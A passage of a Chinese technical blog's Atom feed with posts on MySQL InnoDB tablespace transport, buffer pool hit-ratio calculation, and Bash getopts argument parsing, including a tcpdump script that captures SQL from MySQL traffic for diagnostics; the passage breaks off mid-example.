    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpeg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>不吃饱哪有力气减肥啊。</strong></p></blockquote><p>innodb表空间传输，是MySQL5.6开始加入的新特性，支持普通表空间拷贝到其他实例下，MySQL5.7支持分区表的表空间传输，使innodb表的拷贝变得更加简单容易。</p><p>方便是方便了，但也要需要注意:</p><ul><li>innodb表空间传输不要用来做主从复制，否则会出现数据不一致的问题;</li><li>使用之前，要确认使用了innodb_file_per_table即独立表空间;</li><li>在表空间导出的过程中，事务不能进行写操作, 应该注意选择操作时间, 应该选择业务低峰期操作;</li><li>默认不支持导出有外键的表, 可以通过set foreign_key_checks=0强制忽略, 但仅限于普通表, 而分区表暂时不支持这样操作。</li></ul><p>我们知道了innodb表空间传输的特点和使用注意事项, 现在考虑一下应用场景。因为不做主从复制，就只能做一些离线方面的使用，比如把线上某个生产表拿到离线环境做统计分析等等。</p><p>下面介绍innodb普通表空间传输和分区表空间传输的操作过程<br>1.innodb普通表空间传输</p><p>1.1目标库<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql> create table t2(id int auto_increment, name varchar(20), primary key(id));</span><br><span class="line">mysql> insert into t2(name) values(<span class="string">'aa'</span>),(<span class="string">'bb'</span>),(<span class="string">'cc'</span>);</span><br><span class="line">mysql> alter table t2 discard tablespace;</span><br></pre></td></tr></tbody></table></figure><p></p><p>1.2 源库<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql> flush tables t2 <span class="keyword">for</span> <span class="built_in">export</span>;</span><br><span class="line"></span><br><span class="line">shell> scp -P2222 /data/mysql/mysql_3306/data/db1/t2.{cfg,ibd} 172.16.123.103:/data/mysql/mysql_3306/data/<span class="built_in">test</span>/</span><br><span class="line"></span><br><span class="line">mysql> unlock tables;</span><br></pre></td></tr></tbody></table></figure><p></p><p>1.3 目标库<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell> chown mysql.mysql /data/mysql/mysql_3306/data/<span class="built_in">test</span>/t2.*</span><br><span class="line"></span><br><span class="line">mysql> alter table t2 import tablespace;</span><br></pre></td></tr></tbody></table></figure><p></p><p>2.innodb分区表空间传输<br>测试分区表结构<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql> create table t3(id int auto_increment, name varchar(20), primary key(id)) partition by key(id) partitions 4;</span><br></pre></td></tr></tbody></table></figure><p></p><p>2.1 目标库<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql> create table t3(id int auto_increment, name varchar(20), primary key(id)) partition by key(id) partitions 4;</span><br></pre></td></tr></tbody></table></figure><p></p><p>插入测试数据(省略)<br>2.2 源库<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql> flush tables t3 <span class="keyword">for</span> <span class="built_in">export</span>; <span class="comment">#导出整个分区表</span></span><br><span class="line"></span><br><span class="line">shell> cp -a /data/mysql/mysql_3306/data/db1/t3* /var/tmp/</span><br><span class="line"></span><br><span class="line">mysql> unlock tables;</span><br></pre></td></tr></tbody></table></figure><p></p><p>2.3 目标库</p><p>2.3.1 导入全数分区<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">目标库</span><br><span class="line">mysql> alter table t3 discard tablespace;</span><br><span class="line">或</span><br><span class="line">mysql> alter table t3 discard partition all tablespace;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源库</span><br><span class="line">shell> scp -P2222 -r t3* 172.16.123.103:/data/mysql/mysql_3306/data/<span class="built_in">test</span>/</span><br><span class="line">shell> chown mysql.mysql /data/mysql/mysql_3306/data/<span class="built_in">test</span>/ -R</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标库</span><br><span class="line">mysql> alter table t3 import tablespace;</span><br></pre></td></tr></tbody></table></figure><p>2.3.2 导入指定分区<br>只导p1分区<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标库</span><br><span class="line">mysql> alter table t3 discard partition p1 tablespace;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">源库</span><br><span class="line">shell> scp -P2222 -r t3p1 172.16.123.103:/data/mysql/mysql_3306/data/<span class="built_in">test</span>/</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标库</span><br><span class="line">mysql> alter table t3 import partition p1 tablespace;</span><br></pre></td></tr></tbody></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>源库上<br><code>flush tables tbname for export;</code>—><code>拷贝文件</code>–><code>unlock tables;</code></p><p>目标库上<br><code>alter table tbname discard [partition partition_names | ALL] tablespace;</code>–><code>拷贝文件过来,改权限</code>–><code>alter table tbname IMPORT [PARTITION partition_names | ALL] TABLESPACE;</code></p><p>再次提醒</p><p>做<code>flush tables xx discard tablespace</code>之前，<strong><em>务必三思</em></strong>, 一定要搞清楚在哪个库操作, 万一在生产库上操作，这就悲剧了!</p><h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p><a href="https://hzkeung.com/2017/06/07/innodb-tablespace-copying" target="_blank" rel="noopener">Huang Jinqiang</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpeg&quot; class=&quot;full-image&quot; alt=&quot;
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>从MySQL源码学习运维Innodb buffer命中率计算</title>
    <link href="https://jiemin.wang/2019/04/03/mysql-innodb-buffer-pool-hit/"/>
    <id>https://jiemin.wang/2019/04/03/mysql-innodb-buffer-pool-hit/</id>
    <published>2019-04-03T07:34:53.000Z</published>
    <updated>2019-04-03T07:51:40.125Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpeg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>天没降大任于我，照样苦我心智，劳我筋骨。</strong></p></blockquote><h2 id="计算公式"><a href="#计算公式" class="headerlink" title="计算公式"></a>计算公式</h2><p>按官方手册推荐<code>Innodb buffer Hit Ratios</code>的计算是:<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">100-((iReads / iReadRequests)*100)</span><br><span class="line">iReads : mysql->status->Innodb_buffer_pool_reads</span><br><span class="line">iReadRequests: mysql->status->Innodb_buffer_pool_read_requests</span><br></pre></td></tr></tbody></table></figure><p></p><p>mysqlsqlreport中关于<code>buffer</code>命中计算是:<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ib_bp_hit=100-(Innodb_buffer_pool_reads/Innodb_buffer_pool_read_requests)*100</span><br></pre></td></tr></tbody></table></figure><p></p><p>另外我们知道查看<code>Innodb Buffer Hit Ratios</code>的地方是:<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show engine innodb status\G;</span><br><span class="line">Buffer pool hit rate : XXXX/1000;</span><br></pre></td></tr></tbody></table></figure><p></p><p>那个XXX/1000即是<code>buffer pool hit ratios</code>的命中.</p><p><code>innodb buffer hit Ratios</code>的命中计算需要本次取的值和上次值做一个减法公式应该为<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ib_bp_hit=1000 – (t2.iReads – t1.iReads)/(t2.iReadRequest – t1.iReadRequest)*1000</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>t(n): 时间点 两个时间间隔最少是30秒以上,在小意义不大.</li><li>iReads: Innodb_buffer_pool_reads</li><li>iReadRequest: Innodb_buffer_pool_read_requests</li></ul><p>思考:<br>对于innodb_buffer_pool_read_requests, innodb_buffer_pool_reads这种累加值,当很大时进行: innodb_buffer_pool_reads/innodb_buffer_pool_read_requests 相来讲只能得到从开始到现在的命中率的表现了. 如果想得到现在近五分钟,近一分钟或是8点到9点每分钟的命中率情况,如果还是按着innodb_buffer_pool_reads/innodb_buffer_pool_read_requests 进行计算,只能得到mysqld开起累计在8点-9点的每分钟的累计平均命中情况.</p><p>所以如果想到每(五)分钟的命中情况,就需要本次取得的值和一(五)分钟前的值进行相减,然后进行运算.这样才能得到一个当下的bp命中情况.</p><p>两种方法没实质的对错的问题,但相对于源码中的那种计算方式更容让发现数据库的抖动问题.</p><p>能解决的问题:</p><p>偶而的数据库性能抖动能直观的反应出来.</p><h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p><a href="http://wubx.net/mysql_innodb_buffer_pool_hit/" target="_blank" rel="noopener">吴 炳锡(数据库架构师):从MySQL源码学习运维Innodb buffer命中率计算</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpeg&quot; class=&quot;full-image&quot; alt=&quot;
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>Linux中SHELL内置getopts命令获取命令行参数</title>
    <link href="https://jiemin.wang/2019/04/03/shell-getopts/"/>
    <id>https://jiemin.wang/2019/04/03/shell-getopts/</id>
    <published>2019-04-03T07:14:55.000Z</published>
    <updated>2019-04-03T07:33:23.920Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpeg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>做人如果没有梦想，那和咸鱼有何区别？</strong></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写程序的时候经常要处理命令行参数，本文描述在Bash下的命令行处理方式。</p><p>选项与参数:</p><p>如下一个命令行:<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.sh -f config.conf -v --prefix=/home</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们称-f为选项，它需要一个参数，即config.conf, -v 也是一个选项，但它不需要参数。</p><p>–prefix我们称之为一个长选项，即选项本身多于一个字符，它也需要一个参数，用等号连接，当然等号不是必须的，/home可以直接写在–prefix后面，即–prefix/home,更多的限制后面具体会讲到。</p><p>在bash中，可以用以下三种方式来处理命令行参数，每种方式都有自己的应用场景。</p><ul><li>手工处理方式</li><li>getopts</li><li>getopt</li></ul><p>由于shell命令行的灵活性，自己编写代码判断时，复杂度会比较高。使用内部命令 getopts 可以很方便地处理命令行参数。一般格式为：</p><p><strong>调用格式：</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getopts</span> options variable</span><br></pre></td></tr></tbody></table></figure><p></p><p>getopts 的设计目标是在循环中运行，每次执行循环，getopts 就检查下一个命令行参数，并判断它是否合法。即检查参数是否以 - 开头，后面跟一个包含在 options 中的字母。如果是，就把匹配的选项字母存在指定的变量 variable 中，并返回退出状态0；如果 - 后面的字母没有包含在 options 中，就在 variable 中存入一个 ？，并返回退出状态0；如果命令行中已经没有参数，或者下一个参数不以 - 开头，就返回不为0的退出状态。</p><p><strong>参数说明：</strong></p><ul><li>option_string 选项名称 </li><li>variable 选项的值 </li></ul><blockquote><p>选项之间使用<strong>冒号:</strong>分隔，也可以直接连接， <strong>:</strong> 表示选项后面有传值。<br>  当getopts命令发现冒号后，会从命令行该选项后读取该值。如该值存在，将保存在特殊的变量OPTARG中。</p></blockquote><p>当option_string用<strong>:</strong>开头，getopts会区分invalid option错误和miss option argument错误。</p><p>invalid option时, varname会被设成? </p><p>miss option argument时，varname会被设成:</p><p>如果option_string不用:开头，invalid option错误和miss option argument错误都会使varname被设成?。</p><p><strong>getopts包含两个内置变量，OPTARG和OPTIND</strong></p><ul><li>OPTARG 保存选项后的参数值 </li><li>OPTIND 表示命令行下一个选项或参数的索引 </li></ul><h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><p>例子1: 使用getopts命令获取参数<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> a:b:c:d opts; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$opts</span> <span class="keyword">in</span></span><br><span class="line">        a) a=<span class="variable">$OPTARG</span> ;;</span><br><span class="line">        b) b=<span class="variable">$OPTARG</span> ;;</span><br><span class="line">        c) c=<span class="variable">$OPTARG</span> ;;</span><br><span class="line">        d) d=<span class="variable">$OPTARG</span> ;;</span><br><span class="line">        ?) ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"a=<span class="variable">$a</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"b=<span class="variable">$b</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"c=<span class="variable">$c</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"d=<span class="variable">$d</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></tbody></table></figure><p></p><p>执行输出<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./test.sh -a 1 -b 2 -c 3 -d 4</span><br><span class="line">a=1</span><br><span class="line">b=2</span><br><span class="line">c=3</span><br><span class="line">d=</span><br></pre></td></tr></tbody></table></figure><p></p><blockquote><p>option_string a<span class="github-emoji" style="color: transparent;background:no-repeat url(https://assets-cdn.github.com/images/icons/emoji/unicode/1f171.png?v8) center/contain" data-src="https://assets-cdn.github.com/images/icons/emoji/unicode/1f171.png?v8">🅱</span>c:d </p></blockquote><blockquote><p>a,b,c后都有:</p></blockquote><blockquote><p>d后没有: </p></blockquote><blockquote><p>所以可以获取到a,b,c的值 </p></blockquote><p>例子2: option_string前加:<br>上例中，如果a,b,c任意一个没有传值，将会提示出错。例如 -c 不传值。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./test.sh -a 1 -b 2 -c</span><br><span class="line">./test.sh: option requires an argument -- c</span><br><span class="line">a=1</span><br><span class="line">b=2</span><br><span class="line">c=</span><br><span class="line">d=</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们在option_string前加上:，则可以屏蔽这个错误<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> :a:b:c:d opts; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$opts</span> <span class="keyword">in</span></span><br><span class="line">        a) a=<span class="variable">$OPTARG</span> ;;</span><br><span class="line">        b) b=<span class="variable">$OPTARG</span> ;;</span><br><span class="line">        c) c=<span class="variable">$OPTARG</span> ;;</span><br><span class="line">        d) d=<span class="variable">$OPTARG</span> ;;</span><br><span class="line">        ?) ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"a=<span class="variable">$a</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"b=<span class="variable">$b</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"c=<span class="variable">$c</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"d=<span class="variable">$d</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></tbody></table></figure><p></p><p>执行输出<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./test.sh -a 1 -b 2 -c</span><br><span class="line">a=1</span><br><span class="line">b=2</span><br><span class="line">c=</span><br><span class="line">d=</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>在option_string前加上:，可以屏蔽缺失传值的错误，但如果缺失的是前面选项的值，那么获取到的值将会错误。</strong></p><p>例如缺失a的传值，命令会把-a后的-b作为了-a的值，导致错误。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./test.sh -a -b 2 -c 3</span><br><span class="line">a=-b</span><br><span class="line">b=</span><br><span class="line">c=</span><br><span class="line">d=</span><br></pre></td></tr></tbody></table></figure><p></p><p>因此使用getopts命令时，对于没有传值的选项，选项名称也不要加入命令行中。<br>例如a不传值，则-a不要加入命令行。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./test.sh -b 2 -c 3</span><br><span class="line">a=</span><br><span class="line">b=2</span><br><span class="line">c=3</span><br><span class="line">d=</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="SHELL-代码"><a href="#SHELL-代码" class="headerlink" title="SHELL 代码"></a>SHELL 代码</h2><p>以上是示例，下面贴上我写的脚本代码：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: Created by jiemin.wang</span></span><br><span class="line"><span class="comment"># QQ: 278667010</span></span><br><span class="line"><span class="comment"># E-mail: 278661010@qq.com or wangjiemin880228@gmail.com</span></span><br><span class="line"><span class="comment"># Created Time: Wed Apr  3 14:15:12 CST 2019</span></span><br><span class="line"><span class="comment"># function: This is tcpdump grabs SQL executed by MySQL</span></span><br><span class="line"><span class="comment"># version: 1.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">usage</span></span>(){</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Usage:"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">" <span class="variable">$(basename $0)</span> [OPTION]:"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"-n net"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"-P port"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq <span class="string">"0"</span> ];<span class="keyword">then</span></span><br><span class="line">usage</span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> :n:P: arg</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$arg</span> <span class="keyword">in</span></span><br><span class="line">n)</span><br><span class="line">net=<span class="variable">$OPTARG</span></span><br><span class="line">;;</span><br><span class="line">P)</span><br><span class="line">port=<span class="variable">$OPTARG</span></span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tcpdump -i "$net" -s 0 -l -w - dst port "$port" | strings | perl -e '</span></span><br><span class="line">tcpdump -i <span class="string">"<span class="variable">$net</span>"</span> -s 0 -l -w file dst port <span class="string">"<span class="variable">$port</span>"</span> | strings | perl -e <span class="string">'</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">while(<>) { chomp; next if /^[^ ]+[ ]*$/;</span></span><br><span class="line"><span class="string">if(/^(SELECT|UPDATE|DELETE|INSERT|SET|COMMIT|ROLLBACK|CREATE|DROP|ALTER|CALL)/i) {</span></span><br><span class="line"><span class="string">if (defined $q) { print "$q\n"; }</span></span><br><span class="line"><span class="string">$q=$_;</span></span><br><span class="line"><span class="string">} else {</span></span><br><span class="line"><span class="string">$_ =~ s/^[ \t]+//; $q.=" $_";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}'</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="其他示例"><a href="#其他示例" class="headerlink" title="其他示例"></a>其他示例</h2><p>在网上找了一个示例,贴上来,仅供参考<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line">QUIET=</span><br><span class="line">VERBOSE=</span><br><span class="line">DEVICE=</span><br><span class="line">LOGFILE=/tmp/default</span><br><span class="line"></span><br><span class="line">usage()</span><br><span class="line">{</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Usage: `basename <span class="variable">$0</span>` [-qv] [-l LOGFILE] -d DEVICE input_file [input_file2...]"</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">[ <span class="variable">$#</span> -eq 0 ] && usage</span><br><span class="line"></span><br><span class="line"><span class="comment">#option_string以冒号开头表示屏蔽脚本的系统提示错误，自己处理错误提示。</span></span><br><span class="line"><span class="comment">#后面接合法的单字母选项，选项后若有冒号，则表示该选项必须接具体的参数</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> :qvd:l: OPTION</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$OPTION</span> <span class="keyword">in</span></span><br><span class="line">        q)</span><br><span class="line">            QUIET=y</span><br><span class="line">            ;;</span><br><span class="line">        v)</span><br><span class="line">            VERBOSE=y</span><br><span class="line">            ;;</span><br><span class="line">        d)</span><br><span class="line">            DEVICE=<span class="variable">$OPTARG</span>        <span class="comment">#$OPTARG为特殊变量，表示选项的具体参数</span></span><br><span class="line">            ;;</span><br><span class="line">        l)</span><br><span class="line">            LOGFILE=<span class="variable">$OPTARG</span></span><br><span class="line">            ;;</span><br><span class="line">        \?)                       <span class="comment">#如果出现错误，则解析为?</span></span><br><span class="line">            usage</span><br><span class="line">            ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#$OPTIND为特殊变量，表示第几个选项，初始值为1</span></span><br><span class="line"><span class="built_in">shift</span> $((<span class="variable">$OPTIND</span> - 1))      <span class="comment">#除了选项之外，该脚本必须接至少一个参数</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$DEVICE</span>"</span> ]; <span class="keyword">then</span>   <span class="comment">#该脚本必须提供-d选项</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"You must specify DEVICE with -d option"</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"you chose the following options.."</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Quiet=<span class="variable">$QUIET</span> VERBOSE=<span class="variable">$VERBOSE</span> DEVICE=<span class="variable">$DEVICE</span> LOGFILE=<span 